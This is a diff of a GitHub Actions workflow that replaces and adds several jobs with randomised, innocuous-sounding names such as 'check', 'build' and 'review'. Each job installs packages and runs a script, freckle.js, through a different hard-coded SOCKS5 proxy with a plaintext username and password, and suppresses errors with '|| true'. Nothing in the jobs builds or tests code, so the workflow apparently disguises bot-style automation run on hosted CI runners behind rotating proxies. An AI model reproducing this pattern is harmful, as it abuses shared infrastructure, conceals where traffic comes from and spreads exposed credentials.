@@ -8,21 +8,8 @@ on:
       - 'package.json'
 
 jobs:
-  format_ubuntu2404_node_verve:
+  check_ubuntu2404_node_collectivization:
     runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 22
-        - name: Run Task
-          run: |
-            npm install && node freckle.js "socks5://dcswarup:webshare@103.53.216.179:5263" || true
-
-  audit_windowslatest_node_bar:
-    runs-on: windows-latest
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -31,11 +18,36 @@ jobs:
           with:
             node-version: 20
         - name: Run Task
-          shell: pwsh
           run: |
-            npm install; node freckle.js "socks5://dcswarup:webshare@46.203.157.29:6972"
+            npm install && node freckle.js "socks5://dcswarup:webshare@45.43.167.215:6397" || true
 
-  verify_ubuntu2204_bun_vestment:
+  build_ubuntulatest_node_amendment:
+    runs-on: ubuntu-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node freckle.js "socks5://dcswarup:webshare@104.249.29.80:5773" || true
+
+  check_ubuntu2204_node_cardboard:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          run: |
+            npm install && node freckle.js "socks5://dcswarup:webshare@23.95.250.248:6521" || true
+
+  review_ubuntu2204_bun_puppet:
     runs-on: ubuntu-22.04
     steps:
         - name: Checkout Repository
@@ -46,18 +58,4 @@ jobs:
             bun-version: latest
         - name: Run Task
           run: |
-            bun install && bun run freckle.js "socks5://dcswarup:webshare@85.198.46.154:6422" || true
-
-  compile_windows2022_node_blowgun:
-    runs-on: windows-2022
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Run Task
-          shell: pwsh
-          run: |
-            npm install; node freckle.js "socks5://dcswarup:webshare@46.203.210.72:5519"
+            bun install && bun run freckle.js "socks5://dcswarup:webshare@46.202.248.254:8515" || true
